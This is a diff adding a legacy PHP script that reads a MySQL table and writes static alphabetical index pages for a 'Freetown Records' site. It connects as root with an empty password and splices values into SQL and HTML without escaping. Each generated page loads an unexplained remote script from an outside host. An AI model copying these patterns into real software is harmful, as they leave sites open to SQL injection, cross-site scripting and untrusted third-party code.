@@ -1,0 +1,89 @@
+<?
+set_time_limit (0);
+$Host = "localhost";
+$User = "root";
+$Password = "";
+$DBName = "world";
+$Tablename = "T1";
+$Link = mysql_connect ($Host, $User, $Password) or die ("Cannot connect to the database.\n");
+mysql_select_db ("$Tablename");
+
+$Query10 = "SELECT DISTINCT a FROM `freetown_alpha23` order by a";
+$Result10 = mysql_db_query($DBName, $Query10, $Link);
+while ($Row10 = mysql_fetch_array ($Result10))
+	{
+	$maa1 = $Row10[0];
+	
+$fp = fopen("../freetown/pages/0_$maa1.php", "wt");
+
+fwrite($fp, '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">');
+fwrite($fp, "<html><head>");
+fwrite($fp, "<title>Freetown Records</title>");
+fwrite($fp, '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">');
+fwrite($fp, '<link rel="stylesheet" type="text/css" href="../css/index.css">');
+fwrite($fp, "</head><body bgcolor=#000000 text=#FFFFFF link=#FFFFFF vlink=#FFFFFF>");
+fwrite($fp, "<div align=center><img src=../images/logo2.jpg>");
+fwrite($fp, "<div class='div2'>\n");
+fwrite($fp, "<table border=0 width=700><tr><td><font face=arial size=3><b><a href=index.html>Home</a> &gt; ");
+fwrite($fp, "<a href=0_a.php>a</a> ");
+fwrite($fp, "<a href=0_b.php>b</a> ");
+fwrite($fp, "<a href=0_c.php>c</a> ");
+fwrite($fp, "<a href=0_d.php>d</a> ");
+fwrite($fp, "<a href=0_e.php>e</a> ");
+fwrite($fp, "<a href=0_f.php>f</a> ");
+fwrite($fp, "<a href=0_g.php>g</a> ");
+fwrite($fp, "<a href=0_h.php>h</a> ");
+fwrite($fp, "<a href=0_i.php>i</a> ");
+fwrite($fp, "<a href=0_j.php>j</a> ");
+fwrite($fp, "<a href=0_k.php>k</a> ");
+fwrite($fp, "<a href=0_l.php>l</a> ");
+fwrite($fp, "<a href=0_m.php>m</a> ");
+fwrite($fp, "<a href=0_n.php>n</a> ");
+fwrite($fp, "<a href=0_o.php>o</a> ");
+fwrite($fp, "<a href=0_p.php>p</a> ");
+fwrite($fp, "<a href=0_q.php>q</a> ");
+fwrite($fp, "<a href=0_r.php>r</a> ");
+fwrite($fp, "<a href=0_s.php>s</a> ");
+fwrite($fp, "<a href=0_t.php>t</a> ");
+fwrite($fp, "<a href=0_u.php>u</a> ");
+fwrite($fp, "<a href=0_v.php>v</a> ");
+fwrite($fp, "<a href=0_w.php>w</a> ");
+fwrite($fp, "<a href=0_x.php>x</a> ");
+fwrite($fp, "<a href=0_y.php>y</a> ");
+fwrite($fp, "<a href=0_z.php>z</a> &gt; ");
+fwrite($fp, "$maa1</td>\n");
+fwrite($fp, "<td align=right><a href='../subscribe.htm'><font face=arial size=3><b>Subscribe</a> | \n");
+fwrite($fp, "<a href=../advertising.php><font face=arial size=3><b>Add a Link</a></td></tr></table>\n");
+fwrite($fp, '<div align=center><p>&nbsp;<p><SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-7v1i"> </SCRIPT></div>');
+fwrite($fp, "\n<p>\n");
+
+$Query11 = "SELECT DISTINCT a,b FROM `freetown_alpha23` where a='$maa1' ORDER by a,b";
+$Result11 = mysql_db_query($DBName, $Query11, $Link);
+
+$Col=1;
+fwrite($fp, "<div class='div1'><p><table width=700><tr>");
+while ($Row11 = mysql_fetch_array ($Result11))
+	{
+	$m0 = $Row11[0];
+	$m1 = $Row11[1];
+	$m2 = $Row11[2];
+	print "$m1<br>";
+	$Search2 = str_replace(" ", "_", $m1);
+	$Lower = strtolower($Search2);
+	$Search3 = str_replace(" ", "_", $m1);
+	$Lower2 = strtolower($Search3);
+	fwrite($fp, "<td><font face=arial size=2><b><a href=c_$Lower.php>$m1</a> </td>");
+	$Col++;
+	if ($Col>3) {
+	$Col=1;
+	fwrite($fp, "</tr><tr>");
+	}	
+	}
+
+fwrite($fp, "</tr></table><p>");
+fwrite($fp, "<div class='div2'><div align=center><font face=arial size=2><b>&copy; 2003 by Tim Johnson</div>");
+fwrite($fp, "</div></div></html>");
+fclose($fp);
+}
+mysql_close ($Link);
+?>
